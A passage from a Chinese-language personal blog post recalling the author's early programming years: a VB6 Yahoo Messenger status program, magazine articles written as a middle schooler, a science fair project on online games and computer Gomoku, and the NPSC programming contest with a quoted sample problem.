鍵盤</code>等等的。</p><p>而我寫過的眾多小程式裡面，有一個一定要特別提出來講，那就是 Yahoo 即時通狀態輪播程式。大家應該都還記得以前的通訊軟體都有一個功能叫做：狀態，會顯示在自己暱稱的右邊，原本的設計初衷應該是放一些：工作中、勿擾等等的狀態，但後來就演變成什麼都可以放，有人放歌詞也有人放一些心情小語。</p><p>最酷的一種就是有一種程式叫做狀態輪播程式，設定好之後就可以讓你的狀態像跑馬燈一樣，每一秒改變一次，顯得十分酷炫。那時候我就稍微研究了一下，發現 Yahoo 有提供相對應的 API 出來，只要用 VB6 引入一個 Yahoo 即時通的 Library 即可，實作十分容易。於是最後就自己做出來這個小程式了：</p><p><img src="/img/the-programming-journey-1-b9b19c0ef05b/0__TzR9kGa40lkghv20.jpg"></p><p>之所以會特別提這件事情，是因為我在國二的時候（2007 年）自己寫信去投稿電腦王，那時候應該是有朋友跟我說可以試試看我才去投的。而且我看了一下我的信箱，原來在投稿電腦王之前，我有先寄信給松崗出版社，說我想出一本 VB6 程式新手教學的書，他們有沒有興趣。後來他們回覆說入門書已經太過氾濫，要有特定主題才能有比較好的切入點。</p><p>我差點就在國二的時候成為電腦書作者了（開玩笑的）</p><p><img src="/img/the-programming-journey-1-b9b19c0ef05b/0__ZCF54utWNLodkuHB.jpg"></p><p>寄了一封不知所云的信給電腦王之後，他們很有耐心的詳細回覆，後來我就參考了他們網站上提供的外稿提案範例，自己寫出來一份提案，後來這提案也順利通過。</p><p><img src="/img/the-programming-journey-1-b9b19c0ef05b/0__HSGyoE__u311QmrNU.jpg"></p><p>最後刊載出來的時候他們有寄給我一本實體雜誌，看到的時候真的超級興奮，是雜誌耶！我寫的東西居然實體出版了！</p><p><img src="/img/the-programming-journey-1-b9b19c0ef05b/0__ald48KDqIQOqwaCQ.jpg"></p><p>這件事之所以一定要特別提出來講，因為它是我人生中重要的一個里程碑，對我來說，它達成了以下幾件事：</p><ol><li>第一次自己賺錢（那時候稿費是 1 字 1 元，好像連程式碼都算，所以我拿了 3000 多的稿費）</li><li>證明自己是有能力寫東西的（仔細想想，應該也顯現了我那時候就喜歡教學吧）</li><li>提升自信（一個國中生投稿電腦雜誌，成功出刊並且賺取稿費，我那時候怎麼想都覺得自己滿厲害）</li><li>辦身份證</li></ol><p>最後一點滿好笑的，出刊之後那邊的編輯跟我要我的身分證字號跟匯款帳號，要匯稿費給我順便在他們 ERP 建檔（那也是我第一次知道 ERP 這名詞），我跟他說：「可是我沒有身分證，我還沒滿 14 歲，過一個月滿了之後我再去辦」</p><p>除了即時通輪播以外，我後來又以原本就想要寫的檔案監視程式再投了一次，也順利通過出刊並且拿到三千多塊的稿費。之後編輯問我對 ASP, PHP 有沒有研究，他們希望能有相關的主題，而我那時候婉拒了，說我對網頁設計很不熟，恐怕無法勝任。</p><p>跟電腦王的故事就到這邊結束，感謝電腦王雜誌，為我的國中生涯，甚至是在我整個人生中都立下一個重要的里程碑。</p><p>（<a href="https://docs.google.com/document/d/1bynr4C_gjmA4jPNo0UE6gKx5v0Cs9BS-J9s8ow2n23c/edit?usp=sharing">即時通那篇最後的完稿</a>，如果有人有興趣的話）</p><p>這一條支線：「利用程式解決自己的問題」對我的另一個影響就是，我發現解決自己的問題是一個非常好的出發點。現在創業都講究要「解決問題」，但常常碰到的難關是：「這真的是一個問題嗎？真的需要被解決嗎？有多少人碰到這個問題？」，而我認為從解決自己的問題著手是一個不錯的開始。</p><p>儘管你的問題不一定是別人的問題，但如果不是的話又如何？至少你解決了自己的問題，幫助了自己。</p><h3 id="科展與程式競賽"><a href="#科展與程式競賽" class="headerlink" title="科展與程式競賽"></a>科展與程式競賽</h3><p>國二的時候仗著自己會寫程式，而且自認功力不差，想說跟幾個同學報名參加科展好了。雖然那時候我根本不知道科展要幹嘛，但我想說：「我滿會寫程式的，就寫個程式去參加吧！」，因為科展沒有資訊組，就報了個「生活與應用科學組」，標題是：揭開網路遊戲的神秘面紗，但其實就是寫一個「多人連線五子棋遊戲」。</p><p><img src="/img/the-programming-journey-1-b9b19c0ef05b/0____ikzLMoTnBqQP0ei.jpg"><br><img src="/img/the-programming-journey-1-b9b19c0ef05b/0__YLLfhz4X1M__qi6SA.jpg"></p><p>這已經是我那時絞盡腦汁畫出來的介面了（用 PhotoImpact 自己畫的），儘管介面長得超級像 Flash，但其實是用 VB6 寫的。</p><p>我剛剛在信箱裡面找到<a href="https://docs.google.com/document/d/1lAjKytvYJnfL32coMrFBaq6cyhXKghbsE6KNOjFFQnk/edit?usp=sharing">當時的科展說明書</a>，我終於想起來那時候是做什麼了，原本不只是一個遊戲。</p><p>當時的主題因為是：「揭開網路遊戲的神秘面紗」，所以一開始先介紹網路遊戲的連線方式，再講到 C&#x2F;S 架構，每一個 Client 都通過 Server 轉傳訊息，轉到另外一個 Client。然後以文字的方式傳送要的指令，例如說：<code>Talk 你好</code>，就是在聊天室講話的意思。</p><p>接著講到外掛的實作原理，簡單分成第一種是攔截封包並且修改，例如把上面的「你好」換成「去死吧」，還截了一張 WPE Pro 抓封包的圖。第二種是修改記憶體位址，截了一張 OllyDbg 的圖說可以反組譯之後從程式碼裡面找到一些資訊。</p><p>之後就是實作時間，實作出一個多人連線遊戲，有 Client 端（就上面看到的那兩張圖），有 Server 端，Server 端可以看到目前玩家人數跟房間狀態，還可以踢人。最後自己寫一個外掛出來，證明上面講的外掛實作原理是有效的。</p><p>這應該是我第一次接觸到網路相關程式。感謝 VB6 的 Winsock，讓我可以很方便的就實作出連線的部分。</p><p>後來這個作品在校內初選的時候被評審說跟科展的方向其實不太符合，科展必須要有一個研究的主題，但這個不太算是在研究。但之後校內有個電腦老師看中我程式能力這點，說我們可以改一個符合科展方向的題目。</p><p>經過老師的建議，改成了：「亂中有序-電腦五子棋研究」（<a href="https://docs.google.com/document/d/1GKuSNzIZQVXodx6s7bylDQIdQlWycSxnn7xu0Z6xdds/edit?usp=sharing">當時參賽的海報檔案</a>）</p><p>給一個五子棋的盤面，利用電腦亂數下棋（蒙地卡羅法），看看電腦落子的位置是否跟其他五子棋軟體（如五子棋大師）一致。有興趣的可以看看上面我附的那個檔案，裡面說明的很詳細。</p><p>最後拿了台北縣科展優等，之後高中申請上師大附中的時候好像有小加分了一下。而老師也有問我明年的科展要不要繼續參加，主題是基因演算法與圍棋的研究。我原本說好，但後來發現國三了時間好像不太夠，於是就作罷了。</p><p>現在想想其實有點後悔，如果當初有做那個主題的話應該還滿好玩的，至少國中就可以知道基因演算法在幹嘛。</p><p>在這一年的科展生涯裡讓我學到做研究的一些方法跟方向，也覺得利用電腦來亂數下棋滿好玩的。但其實在國中階段，影響我最深遠的是另外一條線：程式競賽。</p><p>國中生能比的程式競賽只有一個，由台大主辦的 NPSC，<a href="http://contest.cc.ntu.edu.tw/npsc2016/">網際網路程式設計全國大賽</a>。</p><p>程式競賽在幹嘛呢？其實就是用程式去解決問題，如果要我說的話，會比較像解數學題的感覺，但其實也沒那麼數學。我們直接找一題 NPSC 2016 國中組初賽的題目讓大家看看：</p><blockquote><p><em>頗旺是地虎國⼀個很認真的學⽣，每個禮拜星期⼀到星期五都會到學校上課，⽽星期六及星期天便可以在家裏休息，做其他有趣的課餘活動（如參加 NPSC）。</em></p></blockquote><blockquote><p><em>⽽地虎國是⼀個潮溼的熱帶⼩島，因此，時不時便會有颱⾵來肆虐。只要颱⾵來襲，爲了保護所有⼈⺠的安危，全國便會放假⼀天。</em></p></blockquote><blockquote><p><em>⽽對頗旺⽽⾔，如果在星期⼀到星期五的時候，恰好有颱⾵來襲，便會賺到⼀天在家裏休息的機會，頗旺便會覺得很開⼼；反之，若沒有颱⾵，便⼀樣要到學校上課，頗旺便會覺得不開⼼。但如果是在星期六及星期⽇時，有颱⾵來襲，原本可以好好放假的⼼情，便會被外⾯的⼤⾵⼤⾬給影響，頗旺便會覺得不開⼼：反之，若沒有颱⾵，頗旺便會覺得很開⼼。</em></p></blockquote><blockquote><p><em>現在，你剛好發現⼀⾴頗旺的⽇記，上⾯記著當天的年份、⽉份、⽇期、星期幾、以及有沒有颱⾵，你很好奇頗旺當天是開⼼還是不開⼼。</em></p></blockquote><blockquote><p><em>測試資料只有⼀⾏包含五個整數 Y, M, D, X, T，分別代表年份、⽉份、⽇期、星期幾、有沒有颱⾵。當 X &#x3D; 7，代表當天是星期天。當 T &#x3D; 0 代表當天沒有颱⾵、T &#x3D; 1 代表當天有颱⾵。</em></p></blockquote><blockquote><p><em>如果頗旺當天開⼼，請輸出 “happy” 於⼀⾏，否則請輸出 “unhappy” 於⼀⾏，皆不包<br>  含引號。輸出後請記得換⾏。</em></p></blockquote><blockquote><p><em>Sample Input: 2016 9 28 3 1 , Sample Output: happy<br>Sample Input: 2016 10 21 5 0 , Sample Output: unhappy</em></p></blockquote><p>就是有一個題目說明，跟 Input, Output 的形式跟測試資料。你要做的任務就是去寫一個程式，能夠針對不同的輸入產生出正確的輸出。</p><p>由於我們國中本來就有在做相關的培訓，因此午休時間可以到電腦教室去練習題目，有問題可以問老師或學長，但大多數時間還是自己練習。其實在練習的就是演算法與資料結構，只是我記得國中的時候沒有學到那麼多，好像會 DFS, BFS 跟最短路徑、最小生成樹之類基本的就可以破台了（不太確定，而且國中組難度日漸增加）。</p><p>國二跟國三我都有參加 NPSC，對這比賽的印象是結束後發的餐盒很好吃，那也是我第一次進去台大校園。第一次去台大校園是去比賽的，聽起來就滿厲害。</p><p>名次的話大概都 10 幾名左右，不算太好也不算太壞，就是一個滿普通的成績。但我那時候很享受程式解題的感覺，喜歡思考問題跟解決問題，想通之後再用程式碼寫出來。上課太無聊的時候也可以來想問題，可以想個好幾節課都不會睡著，因為腦袋一直在思考。</p><p>但國中其實只是程式競賽的一個開端而已，真正的戰場，在高中。</p><p>續集傳送門：</p><p><a href="/2017/10/05/the-programming-journey-2-98dea8c475ae/">自學、哲學、講學：我的程式之路（中）</a><br><a href="/2017/10/05/the-programming-journey-3-ebd9e995a4eb/">自學、哲學、講學：我的程式之路（下）</a></p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
